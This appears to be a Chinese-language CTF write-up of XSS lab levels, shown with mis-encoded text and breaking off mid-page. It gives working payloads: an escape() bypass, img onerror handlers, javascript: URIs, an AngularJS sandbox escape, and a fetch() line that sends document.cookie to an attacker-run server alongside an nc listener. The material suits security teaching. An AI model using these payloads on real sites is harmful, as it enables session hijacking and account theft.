data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span><br></pre></td></tr></table></figure></div><ul><li>å°† <code>username</code> çš„å€¼æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œå¹¶èµ‹å€¼ç»™é¡µé¢ä¸­ <code>id=&quot;ccc&quot;</code> çš„å…ƒç´ ã€‚</li><li>ä½¿ç”¨ <code>escape()</code> å¯¹ <code>username</code> è¿›è¡Œç®€å•ç¼–ç ï¼Œè¯•å›¾å‡å°æ³¨å…¥çš„é£é™©ã€‚</li></ul><h5 id="æ¼æ´ï¼š"><a href="#æ¼æ´ï¼š" class="headerlink" title="æ¼æ´ï¼š"></a>æ¼æ´ï¼š</h5><p><code>escape()</code> å¹¶ä¸æ˜¯ä¸€ç§å¯é çš„é˜²æŠ¤æœºåˆ¶ï¼Œå°¤å…¶æ˜¯é’ˆå¯¹ç°ä»£æµè§ˆå™¨ã€‚</p><p>å®ƒæ— æ³•ç¼–ç  <code>&quot;</code>ï¼ˆåŒå¼•å·ï¼‰æˆ– <code>&#39;</code>ï¼ˆå•å¼•å·ï¼‰ï¼Œä¹Ÿä¸ä¼šå¯¹ HTML å…ƒç´ æ ‡ç­¾è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚</p><p>å› æ­¤ï¼Œå¦‚æœç”¨æˆ·é€šè¿‡ URL å‚æ•°æ³¨å…¥ç±»ä¼¼ä»¥ä¸‹å†…å®¹ï¼Œå¯èƒ½è§¦å‘ XSSï¼š</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨é‡Šæ¥ç»•è¿‡<code>escape()</code></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="string">&#x27;;alert(1);&#x27;</span></span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120214102515.bmp"></p><ul><li><strong>ç¬¬ä¸‰å…³</strong></li></ul><p>æµ‹è¯•ç¬¬äºŒå…³çš„payload,å‘ç°ä¸è¡Œï¼ŒæŸ¥çœ‹å‘é€payloadåæºä»£ç ï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> username = <span class="string">&#x27;\&#x27;;alert(1);&#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">document.getElementById(&#x27;</span>ccc<span class="string">&#x27;).innerHTML= &quot;Welcome &quot; + username;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></div><p>å¾ˆæ˜æ˜¾å¯ä»¥å‘ç°<code>&#39;</code>è¢«\è½¬ä¹‰äº†ï¼Œé‚£æˆ‘ä»¬è¯•è¯•<code>img</code>æ ‡ç­¾</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>onerror=alert(1)</code>ï¼šè¿™æ˜¯ä¸€ä¸ª <strong>äº‹ä»¶å¤„ç†å™¨</strong>ï¼Œå½“å›¾ç‰‡åŠ è½½å¤±è´¥æ—¶ï¼Œæµè§ˆå™¨ä¼šè§¦å‘ <code>onerror</code> ä¸­çš„ä»£ç </p></blockquote><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120215557734.bmp"></p><ul><li><strong>ç¬¬å››å…³</strong></li></ul><p>è¿›æ¥å°±åœ¨ä¸€ç›´å¾ªç¯ï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> time = <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> jumpUrl;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>) == <span class="literal">false</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  jumpUrl = location.<span class="property">href</span>; <span class="comment">// æœªæä¾› jumpUrl å‚æ•°ï¼Œé»˜è®¤è·³è½¬åˆ°å½“å‰é¡µé¢</span></span></span><br><span class="line"><span class="language-javascript">  &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  jumpUrl = <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;jumpUrl&#x27;</span>); <span class="comment">// ä» URL å‚æ•°ä¸­è·å– jumpUrl çš„å€¼</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time);</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">function</span> <span class="title function_">jump</span>(<span class="params">time</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span>(time == <span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  location.<span class="property">href</span> = jumpUrl; <span class="comment">// å€’è®¡æ—¶ç»“æŸï¼Œè·³è½¬åˆ° jumpUrl</span></span></span><br><span class="line"><span class="language-javascript">  &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  time = time - <span class="number">1</span> ;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">`é¡µé¢<span class="subst">$&#123;time&#125;</span>ç§’åå°†ä¼šé‡å®šå‘åˆ°<span class="subst">$&#123;<span class="built_in">escape</span>(jumpUrl)&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(jump,<span class="number">1000</span>,time); <span class="comment">// å†æ¬¡è°ƒç”¨ jump å‡½æ•°ï¼Œç»§ç»­å€’è®¡æ—¶</span></span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>); <span class="comment">// æŒ‰ `&amp;` åˆ†å‰²å‚æ•°</span></span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>); <span class="comment">// æŒ‰ `=` åˆ†å‰²é”®å€¼å¯¹</span></span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span></span><br><span class="line"><span class="language-javascript">       &#125;</span></span><br><span class="line"><span class="language-javascript">       <span class="keyword">return</span>(<span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™æ®µ JavaScript å®ç°äº†ä¸€ä¸ª<strong>å€’è®¡æ—¶è·³è½¬åŠŸèƒ½</strong>ï¼Œé€šè¿‡ URL å‚æ•°æŒ‡å®šè·³è½¬çš„ç›®æ ‡åœ°å€ (<code>jumpUrl</code>)ã€‚å¦‚æœæœªæä¾› <code>jumpUrl</code> å‚æ•°ï¼Œåˆ™é»˜è®¤è·³è½¬åˆ°å½“å‰é¡µé¢ã€‚</p><ol><li><strong>å€’è®¡æ—¶æ˜¾ç¤º</strong>ï¼š é¡µé¢ä¼šæ˜¾ç¤ºå€’è®¡æ—¶ï¼Œæç¤ºç”¨æˆ·å‰©ä½™çš„æ—¶é—´å’Œå³å°†è·³è½¬çš„ç›®æ ‡åœ°å€ã€‚</li><li><strong>è·³è½¬é€»è¾‘</strong>ï¼š<ul><li>å€’è®¡æ—¶ç»“æŸåï¼Œé¡µé¢ä¼šè·³è½¬åˆ°æŒ‡å®šçš„ URLã€‚</li></ul></li></ol></blockquote><p>ä½¿ç”¨ç¬¬ä¸‰å…³çš„payloadæ— æ³•è¾¾æˆç›®çš„ï¼Œé‚£å°±å°†jumpUrlç›´æ¥å¤åˆ¶ä¸€ä¸ªjavascriptä»£ç ï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jumpUrl=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120220636338.bmp"></p><ul><li><strong>ç¬¬äº”å…³</strong></li></ul><p>æŸ¥çœ‹æºç ï¼š</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  &lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">      <span class="comment">// ä½¿ç”¨ getQueryVariable(&#x27;autosubmit&#x27;) æ£€æŸ¥å½“å‰ URL æ˜¯å¦åŒ…å« autosubmit å‚æ•°ã€‚</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;autosubmit&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> autoForm = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;autoForm&#x27;</span>);</span><br><span class="line">          <span class="comment">// è¡¨å•çš„ action åŠ¨æ€ä»æŸ¥è¯¢å‚æ•° action è·å–ã€‚</span></span><br><span class="line">          <span class="comment">// å¦‚æœæ²¡æœ‰æä¾› action å‚æ•°ï¼Œåˆ™é»˜è®¤ä¸ºå½“å‰é¡µé¢çš„ URL (location.href)ã€‚</span></span><br><span class="line">  autoForm.<span class="property">action</span> = (<span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>) == <span class="literal">false</span>) ? location.<span class="property">href</span> : <span class="title function_">getQueryVariable</span>(<span class="string">&#x27;action&#x27;</span>);</span><br><span class="line">  autoForm.<span class="title function_">submit</span>();</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// è§£æå½“å‰é¡µé¢çš„ URL æŸ¥è¯¢å‚æ•°ï¼Œå¹¶æ ¹æ®ä¼ å…¥çš„å‚æ•°åè¿”å›å¯¹åº”çš„å€¼ã€‚</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQueryVariable</span>(<span class="params">variable</span>)</span><br><span class="line">&#123;</span><br><span class="line">       <span class="keyword">var</span> query = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">       <span class="keyword">var</span> vars = query.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;vars.<span class="property">length</span>;i++) &#123;</span><br><span class="line">               <span class="keyword">var</span> pair = vars[i].<span class="title function_">split</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">               <span class="keyword">if</span>(pair[<span class="number">0</span>] == variable)&#123;<span class="keyword">return</span> pair[<span class="number">1</span>];&#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span>(<span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></div><blockquote><h3 id="ä»£ç æµç¨‹"><a href="#ä»£ç æµç¨‹" class="headerlink" title="ä»£ç æµç¨‹"></a><strong>ä»£ç æµç¨‹</strong></h3><ol><li><p>ç”¨æˆ·è®¿é—® URLï¼Œä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?autosubmit=<span class="literal">true</span>&amp;action=http://malicious.com</span><br></pre></td></tr></table></figure></div></li><li><p><code>autosubmit</code> å‚æ•°å­˜åœ¨ä¸”ä¸ä¸º <code>false</code>ï¼Œè§¦å‘è¡¨å•è‡ªåŠ¨æäº¤é€»è¾‘ã€‚</p></li><li><p>è¡¨å• <code>action</code> è¢«åŠ¨æ€è®¾ç½®ä¸º <code>http://malicious.com</code>ã€‚</p></li><li><p>è¡¨å•è‡ªåŠ¨æäº¤åˆ°æŒ‡å®šçš„ <code>action</code> URLã€‚</p></li></ol></blockquote><p>é‚£ä¹ˆå¾ˆç®€å•äº†ï¼Œç…§ç€ç¬¬å››å…³ç›´æ¥å†™<code>action</code></p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autosubmit=<span class="literal">true</span>&amp;action=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120221716769.bmp"></p><ul><li><strong>ç¬¬å…­å…³</strong></li></ul><p><mark>AngularJS XSSæ¼æ´<mark></mark></mark></p><p>å‚è€ƒæ–‡ç« ï¼š<a class="link" href="https://nosec.org/home/detail/4153.html">https://nosec.org/home/detail/4153.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><a class="link" href="https://xz.aliyun.com/t/4638?time__1311=n4+xni0Qi=Y6DCDlxGrbDymDRiWCqj=jdx">https://xz.aliyun.com/t/4638?time__1311=n4%2Bxni0Qi%3DY6DCDlxGrbDymDRiWCqj%3Djdx <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>æŸ¥çœ‹æºä»£ç ï¼š</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSé…å¥—æµ‹è¯•å¹³å°<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=Edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://houtai.baidu.com/v2/csssdk&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">html</span>, <span class="selector-tag">body</span>, <span class="selector-class">.app-wrapper</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span> <span class="attr">class</span>=<span class="string">&quot;app-wrapper amis-scope&quot;</span> <span class="attr">ng-app</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;amis-routes-wrapper&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Toast-wrap a-Toast-wrap--topRight&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-main&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-header&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;a-TplField&quot;</span>&gt;</span>XSS test platform<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;a-Page-body&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;a-TplField&quot;</span>&gt;</span>welcome xss<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><ul><li>å…³é”®ç‚¹å…¶å®æ˜¯åœ¨ä¸Šé¢çš„ï¼š</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>å°è¯•è¾“å…¥ä¸€ä¸ª<code>&#123;&#123;2*2&#125;&#125;</code>ï¼Œå‘ç°è¿”å›æ˜¯4ï¼Œè¯´æ˜å¯èƒ½æœ‰æ¨¡æ¿æ³¨å…¥</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120223411159.bmp"></p><p>æ ¹æ®å‚è€ƒæ–‡ç« æ‰¾ä¸ªpayloadç›´æ¥ä¸€æŠŠæ¢­</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#123;&#123;<span class="string">&#x27;a&#x27;</span>.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">charAt</span>=[].<span class="property">join</span>;$eval(<span class="string">&#x27;x=1&#125; &#125; &#125;;alert(1)//&#x27;</span>);&#125;&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241120223603988.bmp"></p><ul><li>ç„¶åå°±æœ‰flagäº†</li></ul><h2 id="BUU-XSS-COURSE-1"><a href="#BUU-XSS-COURSE-1" class="headerlink" title="BUU XSS COURSE 1"></a>BUU XSS COURSE 1</h2><ul><li>è¿›å…¥ç½‘å€å‘ç°ç™»å½•ä¸ä¸Šï¼Œé‚£ä¹ˆä¾¿ä»åæ§½é¡µé¢å…¥æ‰‹</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205207372.bmp"></p><ul><li>ç…§å¸¸å…ˆç”¨ç®€å•çš„ä¸¤ä¸ªæ ‡ç­¾æµ‹è¯•ä¸€ä¸‹ï¼š</li></ul><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><p>ç¬¬ä¸€æ¡è¯­å¥æ²¡å›æ˜¾ï¼Œä½†æ˜¯ç¬¬äºŒä¸ª<code>img</code>æ ‡ç­¾æ˜¯æœ‰å›æ˜¾çš„ï¼Œé‚£ä¹ˆåé¢å°±æ‹¿imgæ ‡ç­¾æ¥å†™ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205438745.bmp"></p><ul><li>æˆ‘ä»¬åœ¨äº‘æœåŠ¡å™¨å…ˆå¯ä¸€ä¸ªç›‘å¬ï¼Œç„¶ååˆ©ç”¨xsså¸¦å‡ºcookieçœ‹ä¸€çœ‹ï¼š</li></ul><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8000</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;fetch(&#x27;http://æœåŠ¡å™¨ip:8000/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div><p>è¿™ä¸ªpayloadçš„æ„æ€æ˜¯ï¼š</p><blockquote><p><strong><code>onerror</code> äº‹ä»¶è§¦å‘</strong>ï¼šå½“å›¾ç‰‡åŠ è½½å¤±è´¥æ—¶ï¼Œè§¦å‘ <code>onerror</code> äº‹ä»¶ã€‚</p><p><strong>ä½¿ç”¨ <code>fetch</code> å‘é€æ•°æ®</strong>ï¼š</p><ul><li><code>fetch</code> æ˜¯ç°ä»£æµè§ˆå™¨æ”¯æŒçš„ç®€æ´ APIï¼Œå¯ç”¨äºå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚</li><li><code>document.cookie</code> ç›´æ¥è·å–å½“å‰é¡µé¢çš„ Cookieã€‚</li></ul><p><strong>å‘é€ Cookie åˆ°ä½ çš„æœåŠ¡å™¨</strong>ï¼š</p><ul><li>å°† <code>cookie</code> é™„åŠ åˆ° URLï¼Œä¾¿äºä½ çš„æœåŠ¡å™¨æ¥æ”¶å’Œè®°å½•ã€‚</li></ul></blockquote><ul><li>æˆ‘ä»¬æŸ¥çœ‹æœåŠ¡å™¨ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241121205643170.bmp"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªcookieæ˜¯ä»å½“å‰webç«¯è·å¾—çš„ï¼Œå¯ä»¥çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªç™»å½•æˆåŠŸç”¨æˆ·çš„cookieï¼Œä¸‹é¢çš„<code>Referer</code>è¡¨ç¤ºæˆ‘ä»¬æ˜¯ä»é‚£ä¸ªé¡µé¢è·³è½¬è¿‡æ¥çš„ï¼Œæˆ‘ä»¬å»æŸ¥çœ‹ä¸€ä¸‹é‚£ä¸ªé¡µé¢ï¼š</p><p><img lazyload src="/images/loading.svg" 